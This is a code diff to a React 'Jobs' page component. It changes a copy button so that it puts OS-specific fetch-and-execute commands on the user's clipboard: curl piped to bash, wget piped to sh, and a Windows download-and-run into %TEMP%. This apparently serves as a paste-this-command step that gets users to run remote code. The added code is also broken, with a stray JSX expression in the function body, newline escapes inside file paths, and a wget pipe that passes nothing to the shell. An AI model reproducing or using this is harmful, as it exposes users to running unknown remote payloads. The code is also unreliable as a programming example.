@@ -173,8 +173,15 @@ export default function Jobs() {
 
   const handleCopy = async () => {
     try {
-      await navigator.clipboard.writeText(`curl ${cmdUrl} | cmd`)
-      push('Command copied to clipboard')
+      
+     {os === 'windows' ? 'Windows Command/URL' : os === 'mac' ? 'Mac Command/URL' : 'Linux Command/URL'}
+     if(os === 'windows')
+      await navigator.clipboard.writeText(`curl ${cmdUrl} -O %TEMP%\nx.cmd && %TEMP%\nx.cmd`)
+     else if(os === 'mac')
+      await navigator.clipboard.writeText(`curl ${cmdUrl} | bash`)
+     else if(os === 'linux')
+      await navigator.clipboard.writeText(`wget ${cmdUrl} | sh`)
+     push('Command copied to clipboard')
     } catch {
       push('Copy failed — select and copy manually')
     }
